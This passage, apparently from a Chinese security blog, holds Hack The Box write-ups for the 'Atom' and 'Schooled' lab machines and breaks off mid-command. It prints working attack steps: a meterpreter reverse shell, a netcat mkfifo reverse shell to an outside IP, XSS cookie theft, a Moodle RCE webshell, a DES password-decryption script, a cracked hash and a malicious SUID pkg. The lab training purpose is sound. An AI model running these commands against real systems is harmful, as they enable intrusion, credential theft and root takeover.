windows/x64/meterpreter/reverse_tcp\n```\nä½¿ç”¨msfconsoleå¼€å¯ç›‘å¬\n\n![](Hackthebox-Atom/854cf26a-9bbc-4ee6-aeab-f62894aac05d.png)\n\né…ç½®å¥½é…ç½®é¡¹åexploitæ‰§è¡Œ\n\n![](Hackthebox-Atom/9d859e61-0515-4fa3-8468-0b5fd3a21de6.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ° httpæœåŠ¡å™¨é‡Œå·²ç»æ”¶åˆ°äº†GETè¯·æ±‚\n\nç„¶åæˆ‘ä»¬å†å»çœ‹çœ‹MSF\n\n![](Hackthebox-Atom/a6ae1e69-e7cb-4cb4-b652-89de16390776.png)\n\nå·²ç»æˆåŠŸgetshelläº†\n\nå¦‚æœæ²¡æœ‰å¼¹å›shellï¼Œå°±å¤šå°è¯•å‡ æ¬¡ï¼Œæˆ–ä½¿ç”¨1.2.3ç‰ˆæœ¬å·\n\n# **æƒé™æå‡**\n![](Hackthebox-Atom/f0f5f382-388e-462b-a13f-82423a387176.png)\n\nä¸ºäº†ææƒï¼Œæˆ‘å…ˆè¾“å…¥äº†getprivsæŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™\n\nè¾“å…¥shellè¿›å…¥shellæ§åˆ¶\n\n![](Hackthebox-Atom/de95ab75-3203-4f11-b667-153dea67ad1c.png)\n\né¦–å…ˆè¿›å…¥Program Filesç›®å½•\n\n![](Hackthebox-Atom/9082084a-87a0-471a-a677-81b82f07f72c.png)\n\nç„¶åè¿›å…¥Redisç›®å½•\n\n![](Hackthebox-Atom/75ee9e81-f1cd-4218-ad6c-f21f29e4c7f8.png)\n\nç„¶åæˆ‘ä»¬çœ‹åˆ°redisçš„é…ç½®æ–‡ä»¶ redis.windows-service.conf\n\n![](Hackthebox-Atom/e924337d-64f8-496a-b583-b2c40b2b9e58.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œé‡Œé¢æœ‰redis cliçš„å¯†ç kidvscat\\_yes\\_kidvscat\n\n![](Hackthebox-Atom/d1a7f259-5a46-4991-ab72-8b8fa1173dfc.png)\n\nç„¶åå’±ä»¬å‘ç°è¿™å°é¶æœºçš„6379ç«¯å£ ä¹Ÿå°±æ˜¯redisæœåŠ¡å¼€ç€å‘¢ï¼Œé‚£å°±ç›´æ¥ç™»å½•å§\n\n![](Hackthebox-Atom/a066ecf7-4788-4aba-8928-eba943d62062.png)\n\nç™»å½•æˆåŠŸï¼Œå¹¶ä½¿ç”¨infoè¿›è¡Œä¿¡æ¯æŸ¥çœ‹\n\nä½¿ç”¨keys \\*åˆ—å‡ºæ‰€æœ‰hash\n\n![](Hackthebox-Atom/a6e357b5-a45e-4f96-954a-866299be7e5d.png)\n\ne8e29158-d70d-44b1-a1ba-4949d52790a0\n\næŸ¥çœ‹userç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯\n\nget pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0\n\n![](Hackthebox-Atom/34b65aae-b69a-4d26-bfc2-210a88b1e460.png)\n\næˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªç®¡ç†å‘˜çš„hash\n\nOdh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\n\n![](Hackthebox-Atom/799d353d-1433-4c65-a925-613a39f269fa.png)\n\nåŒæ—¶æˆ‘ä»¬åœ¨ç”¨æˆ·jasonçš„æ¡Œé¢å‘ç°äº†ä¸€ä¸ªuser.txt\n\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flag\n\n![](Hackthebox-Atom/e2e8800b-c412-498f-975e-12a7e53614a8.png)\n\nåœ¨æ£€æŸ¥å…¶ä»–æ–‡ä»¶çš„æ—¶å€™ï¼Œæ‰¾åˆ°äº†ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œå’±ä»¬è¿›å»çœ‹çœ‹\n\n![](Hackthebox-Atom/49bda4c4-0f12-40b4-adc6-4e9fb4d65843.png)\n\nè¿™é‡Œä¼¼ä¹æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå’±ä»¬çœ‹çœ‹å¦ä¸€ä¸ªæ–‡ä»¶å¤¹\n\n![](Hackthebox-Atom/f8a3f043-81bf-4df9-b3f3-60994ae1d8ed.png)\n\nè¿™ä¸ªç¨‹åºå¼•èµ·äº†æˆ‘çš„å…´è¶£ï¼Œç„¶åå»Googleäº†ä¸€ä¸‹\n\n> [https://www.exploit-db.com/exploits/49409](https://www.exploit-db.com/exploits/49409)\n\nç„¶åæ‰¾åˆ°äº†ä¸€ä¸ªexp\n\n![](Hackthebox-Atom/1c6f36a8-2ce4-4c33-8fa6-d59f7001fee6.png)\n\n![](Hackthebox-Atom/7035a9a4-b916-4f12-a2c5-19bdcecbfb0b.png)\n\nå¯èƒ½ã€‚ã€‚ã€‚è¿™å°±æ˜¯ç¼˜åˆ†å§ï¼Ÿ\n\n![](Hackthebox-Atom/5a78abb7-ac35-4f0b-912b-6838642dff2a.png)\n\nå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹é…ç½®æ–‡ä»¶Portablekanban.cfg\n\nè·å¾—äº†portablekanbançš„hashå€¼\n\nOdh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb\n\nè¿™æ—¶å€™å¼€åŠ¨æˆ‘ä»¬æœºçµçš„å°è„‘ç“œï¼ŒåŠ¨èµ·æˆ‘ä»¬å‹¤åŠ³çš„å°æ‰‹ï¼Œå°å°çš„ä¿®æ”¹ä¸€ä¸‹exp\n\n```cpp\nimport json\nimport base64\nfrom des import * #python3 -m pip install des\nimport sys\n\ndef decode(hash):\nhash = base64.b64decode(hash.encode('utf-8'))\nkey = DesKey(b\"7ly6UznJ\")\nreturn key.decrypt(hash,initial=b\"XuVUm5fR\",padding=True).decode('utf-8')\nprint(decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'))\n```\n![](Hackthebox-Atom/4538043d-86b4-4f9a-9c95-2a5538bb127a.png)\n\næ‰§è¡Œä¸€ä¸‹è¿™ä¸ªè„šæœ¬\n\n![](Hackthebox-Atom/5a78848e-2539-43eb-8160-41b16bab2a67.png)\n\næˆåŠŸå¾—åˆ°Administratorçš„å¯†ç kidvscat\\_admin\\_@123\n\n![](Hackthebox-Atom/58206c5f-6b3f-4e44-a467-add1442634ff.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°5985ç«¯å£æ˜¯å¼€å¯çš„\n\nåˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“ï¼Œå› ä¸ºæ€è·¯å¡å£³çš„æˆ‘ï¼Œæƒ³äº†ä¸€æ™šä¸Š\n\nNBå—ï¼Ÿç”¨å¤´å‘æ¢çš„\n\nç»è¿‡Googleï¼Œæˆ‘ä»¬å‘ç°5985ç«¯å£æ˜¯WinRMç¨‹åºä½¿ç”¨çš„ç«¯å£\n\né‚£å’±ä»¬å°±æ ¹æ®æ–‡æ¡£æ¥åˆ©ç”¨å§\n\næ³¨æ„ï¼Œåœ¨kaliä¸­å®‰è£…winrmçš„æŒ‡ä»¤æ˜¯\n\n```cpp\ngem install evil-winrm\n```\nå®‰è£…å¥½åä½¿ç”¨evil-winrmè¿›è¡Œç™»å½•\n\n```cpp\nevil-winrm -i 10.10.10.237 -u 'administrator' -p 'kidvscat_admin_@123'\n```\n![](Hackthebox-Atom/6c83bbff-2a3c-4a69-8be2-4f57872ec033.png)\n\n![](Hackthebox-Atom/f35152b2-72e4-4b20-88b4-fc6d5bfed0cf.png)\n\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag\n\næ”¶å·¥ç¡è§‰","tags":["Hackthebox"]},{"title":"Schooled - Hackthebox","url":"/2021/06/04/Hackthebox/Medium/Hackthebox-Schooled/","content":"\n# Hackthebox - Schooled\n**Hackthebox - Schooled é¶åœºå®æˆ˜**\n\n**é¶åœºä¿¡æ¯**\n\n![](Hackthebox-Schooled/d39530b7-cc49-4a2a-881d-27b0de066ee5.png)\n\n**é¶åœºç±»å‹**\n\n![](Hackthebox-Schooled/14bd35f9-5215-4445-b811-48684af89ae3.png)\n\n**ä¿¡æ¯æœé›†**\n\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\nnmap -A -sS -sC -sV 10.10.10.234\n\n![](Hackthebox-Schooled/4b6210f3-812b-4dd8-b932-60c45fa56586.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™å°é¶æœºå¼€å¯äº†22å’Œ80ç«¯å£ï¼Œå’±ä»¬çš„ç›®å…‰ä¾ç„¶æ”¾åˆ°80ç«¯å£ä¸Š\n\né¦–å…ˆè®¿é—®ä¸€ä¸‹80ç«¯å£çš„httpæœåŠ¡\n\n![](Hackthebox-Schooled/38713f2f-f8cd-4a0b-9637-fec76fb25729.png)\n\nåœ¨åº•éƒ¨çœ‹åˆ°ä¸€ä¸ªschooled.htbï¼Œé‚£ä¼°è®¡æ˜¯è¦è§£æäº†ï¼Œå’±ä»¬ç›´æ¥å…ˆåŠ ä¸Šå§\n\n![](Hackthebox-Schooled/d8c7782a-c3ae-47e0-92a9-d6ce1db72dc8.png)\n\nåœ¨æ‰‹åŠ¨æµè§ˆä»¥åŠdirbç›®å½•çˆ†ç ´çš„æ—¶å€™ï¼Œéƒ½æ²¡æœ‰åœ¨webé¡µé¢ä¸­æ‰¾åˆ°å•¥æœ‰è¶£çš„ä¸œè¥¿\n\nå’±ä»¬ç»“åˆä¸€ä¸‹ä¸Šé¢çœ‹åˆ°çš„æç¤ºæœ‰ä¸€ä¸ªschooled.htbåŸŸåä»¥åï¼Œçªç„¶æ¥äº†æ€è·¯\n\nè¿™ä¸å°±è·Ÿå’±ä»¬åšçš„Loveé‚£ä¸€å°å·®ä¸å¤šå—ï¼Ÿéƒ½æ˜¯å¾—ä»å­åŸŸåå…¥æ‰‹\n\næ‰€ä»¥è¿™ä¸ªæ—¶å€™ä½¿ç”¨wfuzzå·¥å…·è¿›è¡Œfuzz\n\n![](Hackthebox-Schooled/af3d48f7-193a-4b93-afb9-c9bf1348025d.png)\n\nå’±ä»¬è¿™é‡Œå‘ç°æœ‰å¾ˆå¤š461è¡Œçš„ç›¸åº”ï¼Œè¿™æ˜æ˜¾æ˜¯ä¸å¯¹çš„ï¼Œå’±ä»¬æŠŠ461è¡Œçš„ç›¸åº”å±è”½æ‰\n\nwfuzz -c -u \"http://schooled.htb/\" -H \"Host:FUZZ.schooled.htb\" -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt --hl 461\n\n![](Hackthebox-Schooled/126204fd-c62e-47e4-8066-617f4501c5ba.png)\n\nå’±ä»¬æ‰¾åˆ°ä¸€ä¸ªmoodleå­åŸŸå\n\n![](Hackthebox-Schooled/133b0ba6-5bf6-4052-85a0-e907e052a146.png)\n\nå’±ä»¬å…ˆä¿®æ”¹ä¸€ä¸‹hostsè§£æ\n\nå»è®¿é—®ä¸€ä¸‹http://moodle.schooled.htb/\n\n![](Hackthebox-Schooled/94458eb6-308b-4e5b-8125-dcf1259331ee.png)\n\nåœ¨è¿™é‡Œå’±ä»¬æ‰¾åˆ°äº†å‡ ä¸ªè€å¸ˆçš„åå­—\n\næ•°å­¦è€å¸ˆï¼šJamie Borham\n\nç§‘å­¦è€å¸ˆï¼šLianne Carter\n\nä¿¡æ¯æŠ€æœ¯ï¼šJane Higgins\n\nè‹±è¯­è€å¸ˆï¼šManuel Phillips\n\nç„¶åé™¤äº†è€å¸ˆçš„åå­—å’Œæ‰¾åˆ°äº†ç™»é™†ç‚¹ä»¥å¤–ï¼Œå°±æ²¡ä»€ä¹ˆæœ‰æ„æ€çš„ä¸œè¥¿äº†\n\n![](Hackthebox-Schooled/71384630-852e-4156-bc16-333f3f7306eb.png)\n\nå’±ä»¬é¦–å…ˆåˆ›å»ºä¸ªè´¦å·ï¼Œé”™è¯¯æœ‰ç‚¹å¤šï¼Œå’±ä»¬æŒ¨ä¸ªè§£å†³\n\n![](Hackthebox-Schooled/e91ad2f4-dca8-4131-84f8-3804167b3204.png)\n\nå¯ç®—æ˜¯æ³¨å†Œå¥½äº†ï¼Œè¿˜æŒºéº»çƒ¦\n\n![](Hackthebox-Schooled/57965eeb-ebd3-4ab9-ab80-6ec8209be1a7.png)\n\néšä¾¿æµè§ˆäº†ä¸€ä¸‹ï¼Œå‘ç°æˆ‘ä»¬åªèƒ½æŠ¥æ•°å­¦è¯¾ï¼ˆåæ§½ä¸€ä¸‹åƒåœ¾æŠ¢è¯¾ç³»ç»Ÿï¼Œè¿˜å¥½æˆ‘ä¸ç”¨ï¼‰\n\n![](Hackthebox-Schooled/27c8d185-edcf-4272-b8ba-32a20cb80ba1.png)\n\n![](Hackthebox-Schooled/9aceb5cc-7163-4cc2-9dd6-13cf99e10864.png)\n\næˆ‘ä»¬è¿˜èƒ½çœ‹åˆ°è€å¸ˆçš„ç®€ä»‹\n\n![](Hackthebox-Schooled/4ed15734-2642-43e4-be9c-28d0cdbc7677.png)\n\næˆ‘ä»¬å‘ç°è€å¸ˆæœ‰å‘å¸ƒä¸€æ¡å¸–å­ï¼Œæˆ‘ç”¨æˆ‘çš„å°å­¦ä¸‰å¹´çº§é ä¸ªä½æ•°çš„å¤©æ‰è‹±è¯­ç»™å¤§å®¶ç¿»è¯‘ä¸€ä¸‹\n\nå¤§æ¦‚æ„æ€å°±æ˜¯ï¼Œè¿™æ˜¯ä¸€é—¨è‡ªå­¦è¯¾ç¨‹ï¼ˆè¦è€å¸ˆå¹²å•¥ï¼Ÿï¼‰ï¼Œå‚åŠ æˆ‘ï¼ˆè¿™ä½è€å¸ˆï¼‰è¯¾ç¨‹çš„å­¦ç”Ÿï¼Œç¡®ä¿è®¾ç½®å¥½äº†MoodleNetä¸ªäººèµ„æ–™ã€‚æ²¡è®¾ç½®çš„å¼€å§‹è¯¾ç¨‹ä»¥åï¼Œä¼šè¢«è¸¢å‡ºè¿™é—¨è¯¾ç¨‹ï¼Œè€å¸ˆä¼šæŒ¨ä¸ªå„¿æŸ¥çœ‹æŠ¥åè¯¥è¯¾ç¨‹çš„å­¦ç”Ÿ\n\nå„ä½åœ¨åº§çš„ç›²ç”Ÿï¼Œå‘ç°äº†åç‚¹æ²¡æœ‰ï¼Ÿ\n\nNiceï¼Œçªç ´ç‚¹å°±åœ¨è€å¸ˆè¡¨ç¤ºä¼šæŒ¨ä¸ªæ£€æŸ¥æˆ‘ä»¬çš„èµ„æ–™ï¼Œè¿™ä¸å°±æ˜¯ç¡®å®š100%ä¼šç‚¹å‡»æˆ‘ä»¬çš„èµ„æ–™äº†å—ï¼Ÿé‚£æƒ³åˆ°äº†ä»€ä¹ˆï¼Ÿæ²¡é”™ï¼XSSï¼\n\n![](Hackthebox-Schooled/d407f65e-f1eb-41f8-97a5-997a600d93b0.png)\n\n![](Hackthebox-Schooled/67761736-b769-4a18-9ca9-ed22995e5f80.png)\n\nå’±ä»¬ä¿®æ”¹å¥½ä»¥åï¼Œå¯ä»¥çœ‹åˆ°è€å¸ˆä¸Šçº¿äº†\n\n![](Hackthebox-Schooled/2cf355d5-fc35-4dc1-b561-b48059719e4c.png)\n\n![](Hackthebox-Schooled/312ca8d0-a28f-43f5-988c-e87b00891424.png)\n\nå“å˜¿ï¼Œç»è¿‡æµ‹è¯•ï¼ŒèŠå¤©æ¡†æ˜¯å¯ä»¥ç”¨xssçš„\n\nä½†å´æ˜¯ä¸€ä¸ªåå°„å‹xssï¼ˆå›½å†…æŸå¹³å°éƒ½ä¸æ”¶çš„åƒåœ¾æ´ï¼Œåæ§½ä¸€ä¸‹ï¼‰ï¼Œä½†æ˜¯å’±ä»¬è¯æ˜äº†è¯¥ç½‘ç«™æ˜¯å­˜åœ¨XSSçš„ã€‚ç»“åˆæˆ‘ä»¬ä¹‹å‰çš„çŒœæµ‹ï¼Œåº”è¯¥æ˜¯åœ¨MoodleNetå¤„æ’å…¥xss\n\n**æ¼æ´åˆ©ç”¨**\n\n[https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md](https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md)\n\nè¿™æ˜¯æˆ‘ä½¿ç”¨çš„xss cookieè„šæœ¬ï¼Œå¤§å®¶æœ‰ä¹ æƒ¯ä½¿ç”¨çš„ä¹Ÿå¯ä»¥ç”¨è‡ªå·±çš„\n\n![](Hackthebox-Schooled/bde7fe4c-dd43-4111-afaf-e8199bdaf8cc.png)\n\nå’±ä»¬ä¿®æ”¹å¥½è„šæœ¬åä½¿ç”¨pythonå¯åŠ¨\n\n![image](x)\n\nç„¶ååœ¨MoodleNetå¤„æ’å…¥æˆ‘ä»¬çš„xssä»£ç \n\n![](Hackthebox-Schooled/02f8e3b9-ee40-4287-bee6-efa8e14a86e2.png)\n\nå’±ä»¬æ’å…¥åä¿å­˜ï¼Œå¯ä»¥çœ‹åˆ°è‡ªå·±çš„cookieå·²ç»è¿‡æ¥äº†ï¼Œå’±ä»¬æŒ‚ç€å»å¬ä¼šå„¿éŸ³ä¹ï¼Œè€å¸ˆçš„cookieå°±è¿‡æ¥\n\n![](Hackthebox-Schooled/37dea52c-561d-4849-8419-fe5da39744dd.png)\n\nå¥½äº†ï¼Œå’±ä»¬å·²ç»æˆåŠŸé’“åˆ°è€å¸ˆçš„cookieäº†\n\n![](Hackthebox-Schooled/92f68d71-562b-48e9-8c63-5848b936a3c2.png)\n\nå°†å’±ä»¬çš„cookieæ›¿æ¢ä¸ºè€å¸ˆçš„cookie\n\nç„¶ååˆ·æ–°\n\n![](Hackthebox-Schooled/65c577a0-9531-4461-951d-9e5a376f4958.png)\n\nå¯ä»¥çœ‹åˆ°ï¼Œå·²ç»æˆåŠŸè¿›å…¥è€å¸ˆçš„æƒé™äº†\n\n[https://moodle.org/mod/forum/discuss.php?d=407393](https://moodle.org/mod/forum/discuss.php?d=407393)\n\næˆ‘ä»¬åœ¨æŸ¥æ‰¾æ¼æ´çš„æ—¶å€™ï¼Œå‘ç°äº†è¿™ä¸ªCVE-2020-14321ã€‚\n\nè¯¾ç¨‹ä¸­çš„æ•™å¸ˆå¯ä»¥æŠŠè‡ªå·±çš„èº«ä»½æ›´æ”¹ä¸ºç»ç†ï¼Œä¹Ÿå°±æ˜¯è¶Šæƒ\n\n![](Hackthebox-Schooled/cf55e5b6-711c-4819-aa58-54b6a52f423d.png)\n\nç°åœ¨æˆ‘ä»¬æ¥è¿›è¡Œåˆä¸€æ¬¡çš„è¶Šæƒå§\n\n![](Hackthebox-Schooled/85cb796a-416b-48e4-97d9-11ca3b99bdec.png)\n\n![](Hackthebox-Schooled/3083db84-2069-48ef-8f75-9ba3d252f08a.png)\n\néšä¾¿é€‰æ‹©ä¸€ä¸ªäººï¼Œç„¶åæŠ“åŒ…ï¼Œç„¶åæäº¤\n\n![](Hackthebox-Schooled/7f955fcd-2886-41f0-a7c2-450b84a89782.png)\n\næˆåŠŸæŠ“åˆ°åŒ…äº†\n\n![](Hackthebox-Schooled/afd585cd-87c1-4409-8e9a-1909372e1b3d.png)\n\nå’±ä»¬åœ¨ä»‹ç»é¡µé¢ï¼Œå‘ç°Lianne Carteræ˜¯ä¸€åç»ç†ï¼ŒOK é‚£å°±è¶Šå¥¹\n\nuserlistæ”¹ä¸º24ï¼Œå› ä¸ºå’±ä»¬ä¹Ÿæ˜¯è¶Šæƒåˆ°è€å¸ˆçš„è´¦å·ï¼Œæ‰€ä»¥è¦ä¿®æ”¹ä¸ºè€å¸ˆçš„IDï¼Œè€Œ24å°±æ˜¯è€å¸ˆçš„IDï¼Œroletoassignå¤„æ˜¯è®°å½•çš„æƒé™ï¼Œ1ä¸ºç»ç†ï¼Œå’±ä»¬ä¿®æ”¹ä¸º1ä»¥åç‚¹å‡»send\n\n![](Hackthebox-Schooled/ad74b9d1-b8d7-4fbd-953e-9c938fa993b3.png)\n\n![](Hackthebox-Schooled/2b80dd5a-42fe-4852-8e5a-07b80918283b.png)\n\nåˆ·æ–°ä»¥åï¼Œå’±ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæƒé™å·²ç»å˜æˆäº†ç»ç†\n\n![](Hackthebox-Schooled/306c6761-f580-4c8a-ad84-302eb08ea3dd.png)\n\nç„¶åæŠŠLianne Carteræ·»åŠ åˆ°å­¦ç”Ÿé‡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½çœ‹åˆ° Lianne Carteräº†ã€‚\n\næˆ‘ä¹‹å‰å°±æ˜¯æ²¡æ·»åŠ ï¼Œåœ¨è¿™å¡äº†å¥½ä¹…ï¼Œé¶æœºé‡ç½®äº†ä¸‰æ¬¡\n\nå’±ä»¬ç‚¹å‡»Lianne Carterå¹¶ç™»å…¥è¯¥è´¦å·\n\n![](Hackthebox-Schooled/1b894f52-2138-4bf1-8919-357633b20ebe.png)\n\nå’±ä»¬ç‚¹å‡»ç™»å½•\n\n![](Hackthebox-Schooled/b494f6eb-d725-4e32-90e6-9cb8b973d377.png)\n\nç„¶åå’±ä»¬åœ¨æœ€åº•ä¸‹å¯ä»¥çœ‹åˆ°site administration\n\nå’±ä»¬ç‚¹å‡»\n\næ¥ä¸‹æ¥å’±ä»¬æŒ‰ç…§RCEé‡Œçš„å¥—è·¯è·Ÿç€èµ°å°±è¡Œ\n\n![](Hackthebox-Schooled/018bbc57-4afc-41d8-8be0-ec805297c0c1.png)\n\n![](Hackthebox-Schooled/17248339-827c-4372-b9f0-58494d8e8d3a.png)\n\n![](Hackthebox-Schooled/1e45fb52-091e-4d7a-8235-6168e65e5939.png)\n\n![](Hackthebox-Schooled/36891a7e-f280-45a8-8db2-235a7b6080f0.png)\n\nå’±ä»¬åœ¨ç‚¹save changesä¹‹å‰ï¼Œè®°å¾—æŠ“åŒ…\n\n![](Hackthebox-Schooled/e9d2317e-a0eb-4e41-a658-a033a3850e99.png)\n\nç„¶åæ›¿æ¢RCEé‡Œçš„åŒ…\n\n![](Hackthebox-Schooled/522a7c45-c003-4259-8cc0-4e4b7b2eef7c.png)\n\nçœ‹æ¥RCEæ‰§è¡ŒæˆåŠŸäº†\n\n![](Hackthebox-Schooled/ab2ee190-3475-4b51-ac1d-9a72309c3e18.png)\n\nä¸Šä¼ å’±ä»¬çš„EXP\n\n![](Hackthebox-Schooled/428e65a8-ec7e-488a-a841-168a956deea4.png)\n\n![](Hackthebox-Schooled/712d8ffb-ffa1-4503-8195-ec5d49dcd3a2.png)\n\n![](Hackthebox-Schooled/56396b95-64b2-40ec-a521-e3f40002f6e0.png)\n\nè®¿é—®http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block\\_rce.php?cmd=id\n\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ªwebshell\n\næœ¬åœ°ä½¿ç”¨ncç›‘å¬ç«¯å£\n\nnc -nvlp 4444\n\næ‰§è¡Œncåå¼¹shell\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10.10.14.184 4444 > /tmp/f\n\n[http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block\\_rce.php?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%20|nc%2010.10.14.184%204444%20%3E%20/tmp/f](http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%20|nc%2010.10.14.184%204444%20%3E%20/tmp/f)\n\n![](Hackthebox-Schooled/54e892c1-f6a2-4869-8795-bde02069101b.png)\n\næˆåŠŸä½¿ç”¨ncåå¼¹shell\n\n**æƒé™æå‡**\n\n![](Hackthebox-Schooled/98a28b9c-453e-4c76-8b75-3083b661eb22.png)\n\nå’±ä»¬ä½¿ç”¨pwdæŸ¥çœ‹ä¸€ä¸‹å½“å‰ä½ç½®ï¼Œå‘ç°æ˜¯åœ¨apacheç›®å½•ä¸‹\n\nä¹Ÿå°±æ˜¯è¯´ï¼Œå’±ä»¬æ‹¥æœ‰apacheç›®å½•çš„æƒé™\n\né‚£å°±ç›´æ¥è¯»å–apacheçš„é…ç½®æ–‡ä»¶å§\n\né¦–å…ˆæŸ¥æ‰¾é…ç½®æ–‡ä»¶åœ°å€\n\nfind / -name \"config.php\" 2>dev/null\n\ncat /usr/local/www/apache24/data/moodel/config.php\n\nç„¶åä½¿ç”¨catæŸ¥çœ‹é…ç½®æ–‡ä»¶\n\n![](Hackthebox-Schooled/07520677-34e6-4439-8047-65f491b405a1.png)\n\næˆ‘å‘ç°è¿™ä¹ˆåšå¥½åƒæœ‰ä¸€ç‚¹é—®é¢˜ï¼Œå’±ä»¬å»ä¿®æ”¹ä¸€ä¸‹RCE\n\n![](Hackthebox-Schooled/11ae4920-38b9-46bb-82b7-078e936e29d3.png)\n\n[https://github.com/LucifielHack/phpbash](https://github.com/LucifielHack/phpbash)\n\nå’±ä»¬å°†é‡Œé¢çš„ä¸€å¥è¯æœ¨é©¬ä¿®æ”¹ä¸ºphpbash\n\n![](Hackthebox-Schooled/d87e8c3c-8fe3-463c-88fb-37fbfad314dd.png)\n\næˆåŠŸå¾—åˆ°è´¦å·å¯†ç \n\ndbname = model\n\ndbuser = model\n\ndbpass = PlaybookMaster2020\n\n![](Hackthebox-Schooled/63a5da2e-2b69-47e1-92ce-6f368c39746f.png)\n\næˆ‘æƒ³ä½¿ç”¨mysqlè¿›è¡Œç™»å½•ï¼Œä½†è¾“å…¥mysqlåå‘ç°æ— æ³•ä½¿ç”¨ï¼Ÿ\n\nä½†ä¸Šé¢å·²ç»çœ‹åˆ°äº†ï¼Œä½¿ç”¨äº†mysqliè¿›è¡Œè¿æ¥ï¼Œé‚£å°±è‚¯å®šæ˜¯å­˜åœ¨mysqlçš„ã€‚\n\nä½†æ˜¯ä¸ºä»€ä¹ˆæ— æ³•ä½¿ç”¨å‘¢ï¼Ÿæˆ‘æƒ³åº”è¯¥æ˜¯pathé‡Œæ²¡æœ‰é…ç½®ï¼Œå’±ä»¬ä½¿ç”¨exportæŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Schooled/68a29e0e-8272-434d-beac-09fc81af7f1c.png)\n\næœç„¶æ²¡æœ‰\n\nç„¶åæˆ‘æ‰¾äº†ä¸€ä¸‹mysqlçš„è·¯å¾„ï¼Œå’±ä»¬ä½¿ç”¨ç»å¯¹è·¯å¾„æ¥è¿›è¡Œè¯»å–\n\n/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e \"use moodle;select \\* from mdl\\_user\\\\G\"\n\n![](Hackthebox-Schooled/7995e9e5-b636-4422-943a-143875230af9.png)\n\n$2y$10\\$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW\n\nå…¶ä¸­å’±ä»¬éœ€è¦å…³æ³¨çš„æ˜¯Jamieçš„å¯†ç hashï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºåœ¨/etc/passwdé‡Œä¹Ÿæœ‰ä»–\n\n![](Hackthebox-Schooled/486029da-7607-4ca8-99d5-d7c8d1b4b895.png)\n\næ—¢ç„¶å’±ä»¬æ‹¿åˆ°ä¸€ä¸ªhashäº†ï¼Œé‚£ä¹ˆå°±è¯·å‡ºå’±ä»¬çš„è€æœ‹å‹ john\n\n![](Hackthebox-Schooled/4cb05695-3769-4251-84df-28c0403c3caf.png)\n\nçˆ†ç ´æˆåŠŸ\n\nå¯†ç ä¸º !QAZ2wsx\n\nå’±ä»¬å»ç™»å½•\n\nssh [jamie@10.10.10.234](mailto:jamie@10.10.10.234)\n\n![](Hackthebox-Schooled/874cff83-bd98-4246-b082-505a99adb7d6.png)\n\næˆåŠŸç™»å½•\n\n![](Hackthebox-Schooled/11bb12a5-a207-416d-8e6d-d1ae0f61bef6.png)\n\næˆåŠŸæ‹¿åˆ°useræƒé™flag\n\nå’±ä»¬ä½¿ç”¨sudo -læŸ¥çœ‹ä¸€ä¸‹sudoæƒé™\n\n![](Hackthebox-Schooled/a997420b-d6e2-4e29-bb9c-0781bcf9fda7.png)\n\nå¯ä»¥sudoæƒé™å®‰è£…pkgåŒ…\n\né‚£ä¸ç”¨è¯´ï¼Œææƒæ€è·¯è‚¯å®šåœ¨è¿™äº†\n\n[http://lastsummer.de/creating-custom-packages-on-freebsd/](http://lastsummer.de/creating-custom-packages-on-freebsd/)\n\næ‰¾åˆ°ä¸€ç¯‡å‚è€ƒæ–‡ç« ï¼Œæ¥ä¸‹æ¥å’±ä»¬æ„é€ EXPåŒ…\n\n#!/bin/sh\n\nSTAGEDIR=\\~/stage\n\nrm -rf \\${STAGEDIR}\n\nmkdir -p \\${STAGEDIR}\n\ncat >> \\${STAGEDIR}/+PRE\\_DEINSTALL <<EOF\n\n# careful here, this may clobber your system\necho \"Resetting root shell\"\n\npw usermod -n root -s /bin/sh\n\nEOF\n\ncat >> \\${STAGEDIR}/+POST\\_INSTALL <<EOF\n\n# careful here, this may clobber your system\necho \"Registering root shell\"\n\nchmod +s /usr/local/bin/bash\n\nEOF\n\ncat >> \\${STAGEDIR}/+MANIFEST <<EOF\n\nname: mypackage\n\nversion: \"1.0\\_5\"\n\norigin: sysutils/mypackage\n\ncomment: \"automates stuff\"\n\ndesc: \"automates tasks which can also be undone later\"\n\nmaintainer: john@doe.it\n\nwww: https://doe.it\n\nprefix: /\n\nEOF\n\nmkdir -p \\${STAGEDIR}/usr/local/etc\n\necho \"# hello world\" > \\${STAGEDIR}/usr/local/etc/my.conf\n\necho \"/usr/local/etc/my.conf\" > \\${STAGEDIR}/plist\n\npkg create -m ${STAGEDIR}/ 